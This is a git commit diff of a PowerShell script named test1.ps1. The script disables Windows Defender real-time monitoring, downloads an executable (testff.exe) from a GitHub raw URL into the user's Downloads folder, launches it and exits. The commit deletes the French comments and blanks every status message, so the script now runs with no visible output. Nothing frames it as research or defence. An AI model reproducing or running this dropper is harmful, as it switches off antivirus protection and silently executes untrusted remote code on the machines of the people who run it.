fa89a7d9944f35c901c211d0a29d9e07f14c609e
ExoTiiCk <128480835+ExoTiiCk@users.noreply.github.com>
2025-03-17 00:15:40 +0100

    Update test1.ps1

--- test1.ps1
+++ test1.ps1
@@ -1,56 +1,45 @@
-# Désactiver Windows Defender
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-# Définir l'URL du fichier à télécharger
 $url = "https://github.com/ExoTiiCk/Nouveau-dossier-2-/raw/refs/heads/main/testff.exe"
 
-# Obtenir le nom d'utilisateur actuel
 $userProfile = [System.Environment]::GetFolderPath("UserProfile")
 
-# Définir le chemin local dans le dossier "Téléchargements"
 $localPath = "$userProfile\Downloads\testff.exe"
 
-# Fonction pour afficher l'emplacement du fichier
 function Show-FileLocation {
     param (
         [string]$filePath
     )
-    Write-Output "Le fichier a été téléchargé à l'emplacement suivant : $filePath"
+    Write-Output ""
 }
 
-# Afficher le chemin de téléchargement
-Write-Output "Chemin de téléchargement : $localPath"
+Write-Output ""
 
-# Créer le répertoire "Téléchargements" s'il n'existe pas
 if (-Not (Test-Path -Path "$userProfile\Downloads")) {
     New-Item -ItemType Directory -Path "$userProfile\Downloads"
-    Write-Output "Le répertoire 'Téléchargements' a été créé."
+    Write-Output ""
 }
 
-# Télécharger le fichier avec Invoke-WebRequest
 try {
     Invoke-WebRequest -Uri $url -OutFile $localPath
-    Write-Output "Le fichier a été téléchargé avec succès."
+    Write-Output ""
     Show-FileLocation -filePath $localPath
 } catch {
-    Write-Output "Erreur lors du téléchargement du fichier : $_"
+    Write-Output ""
 }
 
-# Vérifier si le fichier a été téléchargé avec succès
 if (Test-Path $localPath) {
-    Write-Output "Le fichier existe à l'emplacement : $localPath"
+    Write-Output ""
 
-    # Lancer le fichier exécutable
     try {
         Start-Process -FilePath $localPath
-        Write-Output "Le fichier a été exécuté avec succès."
+        Write-Output ""
     } catch {
-        Write-Output "Erreur lors de l'exécution du fichier : $_"
+        Write-Output ""
     }
 } else {
-    Write-Output "Le fichier n'a pas été téléchargé correctement."
+    Write-Output ""
 }
 
-# Fermer la fenêtre PowerShell immédiatement
-Write-Output "Fermeture de la fenêtre PowerShell..."
+Write-Output ""
 exit
